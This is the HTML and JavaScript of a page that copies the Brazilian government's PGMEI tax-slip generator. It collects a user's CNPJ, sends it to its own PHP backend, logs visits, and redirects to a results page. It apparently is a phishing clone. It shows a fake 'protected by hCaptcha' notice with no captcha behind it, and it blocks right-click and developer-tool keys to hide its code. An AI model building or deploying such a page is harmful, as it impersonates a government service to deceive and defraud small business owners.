






<!DOCTYPE html>
<html lang="pt-br" style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf8">
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE">
    <meta http-equiv="content-language" content="pt-br">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">

    <title>PGMEI - Programa Gerador de DAS do Microempreendedor Individual</title>
    
    <link href="assets/css/pgmei.css" rel="stylesheet">
    <script src="assets/js/modernizr.js"></script>
    <script src="assets/js/spin.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Ladda/1.0.6/ladda.min.js" referrerpolicy="no-referrer"></script>

</head>

<body>
    <div class="container-fluid">
        <header class="row">
            <h3><span class="label label-success"><img alt="Brand" src="assets/images/logo-simples.png"> PGMEI</span></h3>
            <h4 class="text-success">Programa Gerador de DAS do Microempreendedor Individual</h4>
        </header>
<section class="row">
    <!-- conteudo principal -->
    <div class="well col-md-12" role="main">
        <div class="container">
            <div class="row">
                <div class="col-md-offset-3 col-md-5">
                    <div class="panel panel-default">
                        <div class="panel-heading">
                            <h4 class="panel-title">Informe o número completo do CNPJ</h4>
                        </div>
                        <div class="panel-body">
                            <form id="consultaForm"> 
                                <div class="form-group">
                                    <div class="col-md-offset-1 col-md-10">
                                        <div class="form-group">
                                            <label for="cnpj" class="control-label">CNPJ completo:</label>
                                            <input type="text" id="cnpj" class="form-control" name="cnpj"  
                                                placeholder="00.000.000/0000-00" required 
                                                title="Digite o CNPJ completo, com 14 dígitos">
                                                <br>
                                                 <div style="color: rgb(85, 85, 85); font-weight: 500; font-size: 8px; cursor: pointer; text-decoration: none; display: inline-block; line-height: 8px;">
                                            <br />
                                            <strong> Protegido por hCaptcha </strong> <br />
                                            <a class="link" tabindex="0" aria-label="Política de Privacidade do hCaptcha" href="https://hcaptcha.com/privacy"> Privacidade</a> e
                                            <a class="link" tabindex="0" aria-label="Termos e Condições do hCaptcha" href="https://hcaptcha.com/terms"> Termos e condições</a>.
                                        </div>
                                        </div>
                                    </div>
                                    <div class="col-md-offset-1 col-md-10">
                                        <div class="form-group">
                                            <button id="consultarBtn" type="submit" class="btn btn-success ladda-button" data-style="slide-left">
                                                <span class="ladda-label">Continuar</span>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </form>

                            <!-- Mensagens -->
                            <div id="loading" style="display:none; margin-top:10px; color:blue;">
                                <span id="loadingText">Consultando CNPJ e débitos...</span>
                            </div>
                            <div id="error-message" style="display:none; margin-top:10px; color:red;"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

        <footer class="row  clearfix">
            <div class="pull-left">
                <p class="text-success">
                    <strong>
                        Versão: 3.16.0
                    </strong>
                </p>
            </div>
            <div class="pull-right"><img src="assets/images/marca_Simples_entes.png" alt=""></div>
        </footer>
    </div>
    <script src="assets/js/jquery.js"></script>
    <script src="assets/js/bootstrap.js"></script>
    <script src="assets/js/ladda.js"></script>
    <script src="assets/js/toastr.js"></script>
    <script src="assets/js/select.js"></script>
    <script src="assets/js/pgmei_old.js"></script>
    <script src="assets/js/pgmei_layout.js"></script>

    
<!-- SCRIPT -->
<script>
// ----------------- FORMATAÇÃO DO CAMPO CNPJ -----------------
const cnpjInput = document.getElementById('cnpj');

// Formatar enquanto digita
cnpjInput.addEventListener('input', function() {
    const value = this.value.replace(/\D/g, '');
    this.value = formatCNPJ(value);
});

// Permitir números, colar e teclas de controle
cnpjInput.addEventListener('keydown', function(e) {
    if ((e.ctrlKey || e.metaKey) && ['a','c','v','x'].includes(e.key.toLowerCase())) return;
    if (!/[0-9]|Backspace|Delete|Tab|ArrowLeft|ArrowRight|ArrowUp|ArrowDown|Home|End/.test(e.key)) {
        e.preventDefault();
    }
});

// Tratar colar
cnpjInput.addEventListener('paste', function(e) {
    e.preventDefault();
    const pasted = (e.clipboardData || window.clipboardData).getData('text');
    const numbers = pasted.replace(/\D/g, '');
    if (numbers.length === 14) {
        this.value = formatCNPJ(numbers);
    }
});

function formatCNPJ(value) {
    if (!value) return '';
    const cleaned = value.replace(/\D/g, '').substring(0, 14);
    let formatted = cleaned;
    if (cleaned.length > 2) formatted = formatted.replace(/(\d{2})(\d)/, '$1.$2');
    if (cleaned.length > 5) formatted = formatted.replace(/(\d{3})(\d)/, '$1.$2');
    if (cleaned.length > 8) formatted = formatted.replace(/(\d{3})(\d)/, '$1/$2');
    if (cleaned.length > 12) formatted = formatted.replace(/(\d{4})(\d)/, '$1-$2');
    return formatted.substring(0, 18);
}

function getCleanCnpj() {
    return document.getElementById('cnpj').value.replace(/\D/g, '');
}

// ----------------- CONSULTA AO BACKEND -----------------
document.getElementById('consultaForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const cnpj = getCleanCnpj();
    const loadingDiv = document.getElementById('loading');
    const errorDiv = document.getElementById('error-message');
    
    errorDiv.style.display = 'none';

    if (!cnpj || cnpj.length !== 14) {
        showError('Por favor, digite um CNPJ válido com 14 dígitos');
        return;
    }

    loadingDiv.style.display = 'block';
    
    try {
        const formData = new FormData();
        formData.append('cnpj', cnpj);
        formData.append('action', 'consultar_completa');

        const response = await fetch('api_mei_direto.php', {
            method: 'POST',
            body: formData
        });

        const data = await response.json();

        if (data.status === 'success') {
            // Armazenar dados na sessão
            sessionStorage.setItem('mei_data', JSON.stringify(data.dados));
            sessionStorage.setItem('cnpj_consultado', cnpj);
            sessionStorage.setItem('ano_consulta', '2026');
            
            // Redirecionar para a página de resultados
            window.location.href = 'inicio.php';
        } else {
            throw new Error(data.message || 'Erro na consulta');
        }
    } catch (error) {
        showError(`Erro ao consultar: ${error.message}`);
    } finally {
        loadingDiv.style.display = 'none';
    }
});

function showError(message) {
    const errorDiv = document.getElementById('error-message');
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';
    setTimeout(() => { errorDiv.style.display = 'none'; }, 10000);
}

// Inicializar botão Ladda
Ladda.bind('.ladda-button', {
    callback: function(instance) {
        // O callback já está sendo tratado no evento submit do formulário
    }
});

// Permitir Enter para enviar
cnpjInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        document.getElementById('consultaForm').dispatchEvent(new Event('submit'));
    }
});

// Focar no campo CNPJ ao carregar a página
document.addEventListener('DOMContentLoaded', function() {
    cnpjInput.focus();
});
</script>



<!--SISTEMA DE VISITAS-->

    <script>
    document.addEventListener("DOMContentLoaded", function () {
    const data = {
        action: 'visit',
        page: 'index.php'
    };

    fetch('assets/registrar_visita.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        if (result.success) {
            console.log(result.message);
        } else {
            console.error(result.message);
        }
    })
    .catch(error => console.error('Erro:', error));
});

</script>

<script>
// Bloqueio simples
document.oncontextmenu = function() { return false; };
document.onkeydown = function(e) {
    if (e.key === 'F12' || e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J') || e.ctrlKey && e.key === 'u') {
        return false;
    }
};
</script>

</body>

</html>
